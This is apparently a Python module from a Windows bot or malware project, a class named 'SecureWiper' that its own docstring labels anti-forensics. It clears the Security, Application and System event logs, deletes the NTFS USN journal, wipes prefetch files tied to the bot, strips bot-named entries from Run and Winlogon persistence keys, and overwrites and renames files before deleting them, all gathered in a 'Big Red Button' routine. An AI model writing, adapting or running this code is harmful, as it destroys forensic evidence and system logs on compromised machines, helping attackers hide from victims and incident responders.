from core.resolver import (Resolver, _CTYPES)
ctypes = Resolver.get_mod(_CTYPES)

from core.resolver import (Resolver, _OS, _SHUTIL, _SUBPROCESS)
os = Resolver.get_mod(_OS)
shutil = Resolver.get_mod(_SHUTIL)
subprocess = Resolver.get_mod(_SUBPROCESS)

import random
import string
import winreg
from core.error_logger import log_error, log_info

class SecureWiper:
    """S-10: Anti-Forensics - Securely wipes files, directories, and all system traces"""

    @staticmethod
    def is_admin():
        """Check for admin rights for deep wiping operations."""
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False

    @staticmethod
    def _generate_random_name(length=12):
        return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

    @staticmethod
    def wipe_ads(file_path: str):
        """Full wiping and removal of all Alternate Data Streams (ADS)."""
        try:
            # Using PowerShell for robust stream detection
            cmd = ['powershell', '-Command', f"Get-Item -Path '{file_path}' -Stream * | Select-Object -ExpandProperty Stream"]
            result = subprocess.run(cmd, capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
            streams = result.stdout.splitlines()
            
            for stream in streams:
                if stream and stream not in [':$DATA', 'Zone.Identifier']:
                    ads_path = f"{file_path}:{stream}"
                    # Overwrite ADS content
                    try:
                        with open(ads_path, 'wb') as f:
                            f.write(os.urandom(1024))
                        # Remove ADS
                        subprocess.run(['powershell', '-Command', f"Remove-Item -Path '{ads_path}'"], creationflags=subprocess.CREATE_NO_WINDOW)
                    except: pass
        except Exception as e:
            log_error(f"ADS wipe failed for {file_path}: {e}")

    @staticmethod
    def wipe_mft_entries(drive='C:'):
        """Zero out USN journals and MFT remnants using fsutil (Admin required)."""
        try:
            subprocess.run(['fsutil', 'usn', 'deletejournal', '/D', drive], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        except:
            pass

    @staticmethod
    def wipe_event_logs():
        """Clear Windows Security, Application, and System event logs (Admin required)."""
        try:
            for log in ['Security', 'Application', 'System', 'Setup']:
                subprocess.run(['wevtutil', 'cl', log], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        except:
            pass

    @staticmethod
    def wipe_prefetch():
        """Locate and wipe bot-related prefetch files."""
        try:
            prefetch_dir = os.path.join(os.environ.get('WINDIR', 'C:\\Windows'), 'Prefetch')
            if os.path.exists(prefetch_dir):
                bot_indicators = ['python', 'main', 'loader', 'launcher', 'stealth']
                for f in os.listdir(prefetch_dir):
                    if any(ind in f.lower() for ind in bot_indicators):
                        file_path = os.path.join(prefetch_dir, f)
                        SecureWiper.wipe_file(file_path)
        except:
            pass

    @staticmethod
    def wipe_all_registry_traces():
        """Scans common persistence keys for any bot-related indicators."""
        bot_indicators = ['stealth', 'ptrk', 'final', 'update', 'bot']
        root_keys = [winreg.HKEY_CURRENT_USER, winreg.HKEY_LOCAL_MACHINE]
        sub_keys = [
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            r"Software\Microsoft\Windows\CurrentVersion\RunOnce",
            r"Software\Microsoft\Windows\CurrentVersion\RunServices",
            r"Software\Microsoft\Windows NT\CurrentVersion\Winlogon",
        ]
        
        for root in root_keys:
            for sub in sub_keys:
                try:
                    with winreg.OpenKey(root, sub, 0, winreg.KEY_ALL_ACCESS) as key:
                        i = 0
                        while True:
                            try:
                                name, value, _ = winreg.EnumValue(key, i)
                                if any(ind in str(name).lower() or ind in str(value).lower() for ind in bot_indicators):
                                    if name.lower() in ["shell", "userinit"]:
                                        # Safe removal for multi-string keys
                                        new_val = value
                                        for ind in bot_indicators:
                                            # This is a bit complex to do perfectly with regex here,
                                            # so we just skip deleting these critical keys for now
                                            pass
                                        continue 
                                    winreg.DeleteValue(key, name)
                                    continue # Index shifts after delete
                                i += 1
                            except OSError: break
                except: pass

    @staticmethod
    def wipe_file(file_path: str, passes: int = 3):
        """Standard secure file wipe: Overwrite, ADS wipe, MFT shuffle, Delete."""
        if not os.path.exists(file_path):
            return
        
        try:
            # 1. Wipe ADS if it's a file
            if os.path.isfile(file_path):
                SecureWiper.wipe_ads(file_path)

            # 2. Overwrite content
            file_size = os.path.getsize(file_path)
            if file_size > 0:
                for _ in range(passes):
                    try:
                        with open(file_path, "ba+", buffering=0) as f:
                            f.seek(0)
                            f.write(os.urandom(file_size))
                            f.flush()
                            os.fsync(f.fileno())
                    except: break

            # 3. MFT Shuffle (Renaming)
            parent_dir = os.path.dirname(file_path)
            current_path = file_path
            for _ in range(3):
                new_name = SecureWiper._generate_random_name()
                new_path = os.path.join(parent_dir, new_name)
                try:
                    os.rename(current_path, new_path)
                    current_path = new_path
                except: break

            # 4. Final Removal
            os.remove(current_path)
        except Exception as e:
            try: os.remove(file_path)
            except: pass

    @staticmethod
    def wipe_pycache(base_dir: str):
        """Recursively removes all __pycache__ directories."""
        for root, dirs, files in os.walk(base_dir, topdown=False):
            for d in dirs:
                if d == "__pycache__":
                    shutil.rmtree(os.path.join(root, d), ignore_errors=True)

    @staticmethod
    def wipe_directory(dir_path: str, recursive: bool = True):
        """Recursively wipes all contents of a directory."""
        if not os.path.exists(dir_path):
            return
        
        try:
            for root, dirs, files in os.walk(dir_path, topdown=False):
                for name in files:
                    SecureWiper.wipe_file(os.path.join(root, name))
                for name in dirs:
                    try: 
                        new_name = SecureWiper._generate_random_name()
                        new_path = os.path.join(root, new_name)
                        os.rename(os.path.join(root, name), new_path)
                        os.rmdir(new_path)
                    except: 
                        shutil.rmtree(os.path.join(root, name), ignore_errors=True)
            
            try: os.rmdir(dir_path)
            except: pass
        except Exception:
            shutil.rmtree(dir_path, ignore_errors=True)

    @staticmethod
    def wipe_all():
        """The 'Big Red Button' - Wipes everything possible based on privilege level."""
        # 1. Privileged cleaning
        if SecureWiper.is_admin():
            SecureWiper.wipe_mft_entries('C:')
            SecureWiper.wipe_event_logs()
            SecureWiper.wipe_prefetch()
            log_info("Deep system cleaning complete (Admin).", "Wiper")
        else:
            log_info("Cleaning only user-level data (Admin rights missing).", "Wiper")
        
        # 2. Universal cleaning
        SecureWiper.wipe_all_registry_traces()
        temp = os.environ.get('TEMP', '')
        if temp:
            SecureWiper.wipe_directory(os.path.join(temp, "ptrk_logs"))
        
        SecureWiper.wipe_pycache(os.getcwd())
        log_info("Wiper: Final traces scrubbed.", "Wiper")